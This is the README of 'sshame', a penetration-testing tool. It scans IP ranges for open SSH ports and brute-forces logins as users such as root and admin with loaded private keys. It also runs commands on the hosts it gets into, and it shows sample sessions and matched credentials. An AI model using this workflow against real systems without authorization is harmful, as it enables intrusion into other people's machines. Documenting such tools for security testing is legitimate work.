# sshame
Interactive tool to brute force ssh public key authentication. Primarily intended for pentration testers. Sshame can execute commends on remote hosts.

## Version history ##

### 0.5 - 2019-08-25 ###

Initial version

## Installing ##

Clone the source from Github:

    git clone https://github.com/HynekPetrak/sshame.git
    cd shame

Then in order to install run:

    sudo python3 setup.py install

In case you want to contribute instead of install run:

    sudo python3 setup.py develop
    
## Run ##

sshame is interactive, based on https://github.com/python-cmd2/cmd2

    # sshame
    (sshame) 
    
Type help to get a list of commands:
    (sshame) help

    Documented commands (type help <topic>):

    Sshame
    ======
    commands  creds  exploit  hosts  keys  resolve  session

    Uncategorized
    =============
    alias  help     macro     py    record        run_script  shell
    edit   history  playback  quit  run_pyscript  set         shortcuts


### Add target hosts ###

In the sshame shell run `hosts -a list-of-ip-ranges-or-hosts [-p port]`:

    (sshame) hosts -a 10.0.0.0/24 -p 22
    Scanning 10.0.0.0/24 on port(s) 22
    ........***.............
    Received 877 packets, got 222 answers, remaining 34 packets
    2019-08-25 19:22:15,633 sshame [I] 'Adding host (port open): 10.0.0.2 22'
    2019-08-25 19:22:15,683 sshame [I] 'Adding host (port open): 10.0.0.1 22'
    2019-08-25 19:22:15,686 sshame [I] 'Adding host (port open): 10.0.0.6 22'
    
 sshame will scan the given hosts with scapy and add those, which have the port open.
 
 To verify added hosts with TCP port open run `hosts -l`
 
 ### Load ssha keys ###
 
 Load private keys with `keys -a glob_path [-p list-of-passwords]`
 
    (sshame) keys -a test/**/*key
    2019-08-25 19:30:40,613 sshame [I] "Adding ssh keys from: ['test/**/*key']"
    2019-08-25 19:30:40,614 sshame [I] "Discovered 4 files in 'test/**/*key'."
    2019-08-25 19:30:40,615 sshame [I] 'Going to examine 4 files.'
    2019-08-25 19:30:40,635 sshame [I] 'Importing ssh-dss key: test/keys/dsa_key'
    2019-08-25 19:30:40,645 sshame [I] 'Importing ssh-rsa key: test/keys/rsa_key'
    2019-08-25 19:30:40,680 sshame [I] 'Importing ecdsa-sha2-nistp256 key: test/keys/ecdsa_key'
    2019-08-25 19:30:40,693 sshame [I] 'Importing ssh-ed25519 key: test/keys/ed25519_key'
    Loaded 4 unique keys, ignoring 0 duplicates

`-p list-of-passwords` is optional in case you load encrypted private keys protected with passwords.

List loaded keys with `keys -l`

### Test keys on hosts ###

To brute force which keys authenticates on which target run `exploit -u list-of-users`:

    (sshame) exploit -u root admin
    2019-08-25 19:34:31,900 sshame [I] 'Preparing target jobs...'
    2019-08-25 19:34:31,933 sshame [I] 'Matching keys - 16 jobs scheduled'
    Completed: [####################] [100.00%]
    2019-08-25 19:34:56,857 sshame [I] '---------------------------------------------------------------------------'

List matching keys with `creds -l`:

    (sshame) creds -l
    [1/1/1]: ssh -i test/keys/rsa_key root@10.0.0.2
    [2/2/1]: ssh -i test/keys/dsa_key admin@10.0.0.1

### Run commands on remote hosts ###

To run commands on remote hosts use `exploit -c whoami`
